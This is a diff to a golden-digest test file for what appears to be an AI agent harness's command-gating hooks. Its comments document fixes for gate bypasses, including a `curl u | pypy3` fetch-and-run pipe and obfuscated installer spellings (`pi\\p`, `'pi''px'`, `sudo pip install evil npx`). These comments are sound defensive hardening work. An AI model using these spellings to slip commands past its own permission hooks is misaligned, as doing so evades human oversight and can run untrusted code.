@@ -1029,6 +1029,75 @@ EXPECTED_DIGESTS = {
     # rendered into. Nothing else moves: no wrapper, skill, command, agent,
     # steering or settings body, and secrets-gate.sh is byte-identical
     # (checked against an install built from 8276300, the 2.7.0 commit).
+    #
+    # [freeze-exception no. 36, 2026-08-04] ISSUE #40 / X-36d: ONE interpreter
+    # set for the pipe trigger AND the install anchor. They were two private
+    # spellings - `alt(INTERPRETERS) + "[.0-9]*"` and `python[0-9.]*` - and
+    # both missed `pypy3` (the stock PyPy binary) and `python3.13t` (CPython
+    # 3.13's FREE-THREADED build). The pipe half was REMOTE EXECUTION:
+    # `curl u | pypy3` ran the fetched bytes, allow/allow at v2.7.0. Both
+    # now read cmdpos.PY_INTERPRETERS + INTERP_SUFFIX; the `t`/`d` ABI tags
+    # join the basename reduction on both substrates so the stage classifier
+    # and the trigger answer the same question the same way.
+    # VERIFIED PER-FILE BEFORE RE-BASELINING: counts stable at 57/69/59,
+    # 0 added, 0 removed, exactly TWO bodies move per fixture -
+    # dependency-gate.sh and sdk_gates/gates.py.
+    # ACCEPTANCE (KB §7): 431 distinct commands x 2 substrates against a
+    # pristine install built from the v2.7.0 TAG - 28 verdicts move
+    # allow -> deny and the PREVIOUSLY-DENIED-NOW-ALLOWED set is EMPTY.
+    # Widening INTERPRETERS also moves pypy stages from "unmodellable" to
+    # "interpreter" in the D20 classifier, which is the ALLOW direction -
+    # that is exactly what the empty set above rules out, and it holds
+    # because the pipe trigger fires before the D20 correlation is reached.
+    #
+    # [freeze-exception no. 37, 2026-08-04] ISSUE #39 / X-36c: the install
+    # scanner takes the LEFTMOST install phrase, not the LONGEST match.
+    # bash matches leftmost-LONGEST and the anchor's wrapper arm consumes
+    # flags AND positionals without bound, so on `sudo pip install evil npx`
+    # the run ate `pip install evil`, the anchor matched the trailing `npx`,
+    # the match covered the whole segment, the argument list came back EMPTY,
+    # and a verb with no arguments reads as a lockfile restore - nothing was
+    # inspected and the command installs `evil`. rc=0 both substrates at
+    # v2.7.0. Both substrates now grow a candidate one token at a time and
+    # take the FIRST prefix the anchor matches (_install_head_split). The
+    # prefix run is NOT narrowed - positionals stay unbounded, because
+    # `timeout 5 pip install evil` needs them and cmdpos's ARITY section
+    # records the 16-of-27 regression an arity table caused; only the CHOICE
+    # of match changes.
+    # VERIFIED PER-FILE BEFORE RE-BASELINING: counts stable at 57/69/59,
+    # 0 added, 0 removed, exactly TWO bodies move per fixture.
+    # ACCEPTANCE (KB §7): 447 distinct commands x 2 substrates against a
+    # pristine install built from the v2.7.0 TAG - 40 verdicts move
+    # allow -> deny (this and no. 36 together) and the
+    # PREVIOUSLY-DENIED-NOW-ALLOWED set is EMPTY.
+    #
+    # [freeze-exception no. 38, 2026-08-04] ISSUE #41 / X-36e: the install
+    # anchor reads THE WORD BASH WILL RESOLVE. bash removes quote characters
+    # and backslashes before resolving a word, so `pi\\p` names pip - and the
+    # emitted hook's cmd_segments RESTORES escapes, so its anchor saw no
+    # installer and `pi\\p install evil` was rc=0 on the SHELL while the SDK
+    # denied. The canonical substrate was the one allowing an unapproved
+    # install. cmdpos.cmd_word's quote-removal half is now named
+    # `unquote_word` and the anchor's token scan reads through it - an
+    # existing, tested reduction applied at one more site.
+    #
+    # THIS EXCEPTION MOVES 12/12/16 BODIES, NOT TWO, and that is expected:
+    # the second half of the fix is in the SHARED _HOOK_HEADER (`_cs_scan`),
+    # so every hook that carries the header moves. Adjacent quoted runs are
+    # ONE word to bash - `sh -c 'pi''px install evil'` runs
+    # `pipx install evil` - but the invoker rule pushed each RUN as its own
+    # segment, so `pi` and `px install evil` arrived and matched nothing.
+    # The spliced word is now pushed too. ADDITIVE: the per-run segments are
+    # still pushed, so the change can only ADD denies, which is what the
+    # empty regression set below measures rather than assumes.
+    # Same body-only-placeholder break as no. 33, and for the same reason.
+    # VERIFIED PER-FILE BEFORE RE-BASELINING: counts stable at 57/69/59,
+    # 0 added, 0 removed; every moved file carries the shared header or is
+    # the SDK module.
+    # ACCEPTANCE (KB §7): 461 distinct commands x 2 substrates against a
+    # pristine install built from the v2.7.0 TAG - 49 verdicts move
+    # allow -> deny across no. 36/37/38 together, and the
+    # PREVIOUSLY-DENIED-NOW-ALLOWED set is EMPTY.
     # ACCEPTANCE (KB §7): the differential corpus, 411 distinct commands x 2
     # substrates, run against a pristine 8276300 baseline and against this
     # tree - 40 verdicts move allow -> deny (the twenty #36 spellings on both
@@ -1200,7 +1269,7 @@ EXPECTED_DIGESTS = {
     # fail (5 checks) against the pre-fix header.
     # [freeze-exception no. 35] dependency-gate.sh + sdk_gates/gates.py only.
     "default":
-        "a7aa2200510def2e5bbee449cd9cb2af68ab2b58bfe19dddfe2b176b37479fae",
+        "2b384f477c0ede42d78f097324829f949ec73abf05cbb734ee104395959721db",
     #   Adversarial-review round-2 additions inside the same exception
     #   (pre-commit, same named set): loop.sh/goal-loop.sh gain the
     #   transient-path definition (no-rejected-event arm + infra_* knobs,
@@ -1314,7 +1383,7 @@ EXPECTED_DIGESTS = {
     # presence test, so both layers agree.
     # [freeze-exception no. 35] same two files as `default` above.
     "full_autonomous":
-        "d2979bcb720c8a01042d125b45feb9b93ee80689c4725317c17400c530aa934b",
+        "fba95a4469a540a4225ed08ea551fbfd332105c8f2bff8e65921cc1db3a9a8d1",
     # [v2.5.0 DS-01 — new flag-on fixture] Deliberate golden ADDITION (not a
     # re-baseline): a fullstack config with design_steering_enabled: true AND
     # design_review_skill_enabled: true. Pins the three flag-gated artifact
@@ -1386,7 +1455,7 @@ EXPECTED_DIGESTS = {
     # moves 11 hook bodies for the same one-function shared-header change.
     # [freeze-exception no. 35] same two files as `default` above.
     "design_steering":
-        "8a6ba1a3c92a24111c22d127932224931b3894cea7e7b26259a2b3ffcca3665b",
+        "228d4c1d1efe160caf6134ebd28f2268af3f7e99f38aa9d5c73748c1a5fa287a",
 }
 
 EXPECTED_ACTION_COUNTS = {
